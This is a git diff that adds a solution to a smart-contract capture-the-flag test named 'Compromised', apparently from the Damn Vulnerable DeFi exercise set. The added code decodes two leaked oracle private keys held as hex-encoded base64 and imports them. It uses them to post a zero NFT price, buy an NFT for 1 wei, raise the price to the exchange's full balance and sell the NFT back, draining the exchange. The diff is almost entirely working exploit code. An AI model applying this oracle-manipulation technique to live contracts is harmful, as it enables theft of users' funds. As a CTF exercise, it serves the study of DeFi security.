@@ -51,6 +51,25 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        const pks = [
+          "4d48686a4e6a63345a575978595745304e545a6b59545931597a5a6d597a55344e6a466b4e4451344f544a6a5a475a68597a426a4e6d4d34597a49314e6a42695a6a426a4f575a69593252685a544a6d4e44637a4e574535",
+          "4d4867794d4467794e444a6a4e4442685932526d59546c6c5a4467344f5755324f44566a4d6a4d314e44646859324a6c5a446c695a575a6a4e6a417a4e7a466c4f5467334e575a69593251334d7a597a4e444269596a5134",
+        ]
+        .map(hex => Buffer.from(hex, 'hex').toString())
+        .map(base64 => Buffer.from(base64, 'base64').toString());
+
+        const oracle1 = await web3.eth.personal.importRawKey(pks[0], "yolo");
+        const oracle2 = await web3.eth.personal.importRawKey(pks[1], "yolo");
+        await web3.eth.personal.unlockAccount(oracle1, "yolo", 100);
+        await web3.eth.personal.unlockAccount(oracle2, "yolo", 100);
+
+        await this.oracle.postPrice("DVNFT", 0, { from: oracle1 });
+        await this.oracle.postPrice("DVNFT", 0, { from: oracle2 });
+        await this.exchange.buyOne({ from: attacker, value: 1 });
+        await this.oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE, { from: oracle1 });
+        await this.oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE, { from: oracle2 });
+        await this.token.approve(this.exchange.address, 1, { from: attacker });
+        await this.exchange.sellOne(1, { from: attacker });
     });
 
     after(async function () {
